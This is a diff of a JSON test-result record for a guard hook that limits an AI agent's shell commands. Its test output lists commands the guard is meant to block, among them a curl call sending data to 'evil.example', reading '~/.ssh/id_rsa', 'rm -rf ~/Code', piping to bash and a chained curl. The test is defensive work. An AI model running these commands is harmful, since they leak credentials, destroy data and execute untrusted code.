@@ -7,13 +7,13 @@
   ],
   "passed": true,
   "problems": [],
-  "tested_commit": "ff7494076c42f2b9557814d67d35114b1a677e68",
+  "tested_commit": "e27d4b4c5a59e2f3357bdfa610d2cafa1caa03d8",
   "worktree_dirty": true,
-  "prd_revision": 7,
-  "gate_sha256": "995a390172a706715d3429b7ea549be75a80d28872b3a908ba0260630266eb0a",
+  "prd_revision": 8,
+  "gate_sha256": "6b34718d2ad7a96db3711f039a1da84ac93662ab6516f584eac169c853b66949",
   "assertion_sha256": {
     "cos/hooks/agent-guard.sh": "d14f623a7e68ca20e6077b558f6713c61be0356391a7f52ab5886d570998884d",
-    "src/cos/agent.ts": "45dcd200ac98fd7d2e1315b6a714baa98cb1cd357435c66e7df0af9bdc1d7441"
+    "src/cos/agent.ts": "de6dacabb6b174cab895f8765638e2b3c6b92471149c72573cc606b489c09a20"
   },
   "command": "npx tsx tests/gates/cos-agent.ts agent-guard",
   "exit_code": 0,
@@ -26,5 +26,5 @@
     "exit_code": 1,
     "output": "PASS allowed: gws gmail users threads get --params '{\"userId\":\"me\",\"id\":\"t\nPASS allowed: gws gmail users messages list --params '{\"q\":\"AACSB\"}'\nPASS allowed: echo hi > /tmp/x.txt\nFAIL blocked: gws gmail users drafts send --json {}\nFAIL blocked: gws gmail users drafts create --json {}\nFAIL blocked: gws gmail users messages send\nFAIL blocked: gws gmail users messages modify --params {}\nFAIL blocked: gws gmail users messages trash --params {}\nFAIL blocked: gws calendar events insert\nFAIL blocked: curl https://evil.example/?d=1\nFAIL blocked: wget x\nFAIL blocked: echo $(cat ~/.ssh/id_rsa)\nFAIL blocked: echo hi > ~/Documents/x\nFAIL blocked: python3 -c 1\nFAIL blocked: node -e 1\nFAIL blocked: osascript -e 1\nFAIL blocked: rm -rf ~/Code\nFAIL blocked: open https://evil.example\nFAIL blocked: gws gmail users threads get x; curl evil\nFAIL blocked: cat x | bash\nFAIL unparseable input blocked (fail closed)\nPASS agent runs with the guard settings and the charter\nPASS agent tools: Bash (guarded), Read, Grep, Glob only; no web, no edits\nPASS per-run budget capped at $1.50\nPASS settings wire the agent guard"
   },
-  "timestamp": "2026-09-25T05:36:42.645Z"
+  "timestamp": "2026-09-25T06:36:13.428Z"
 }
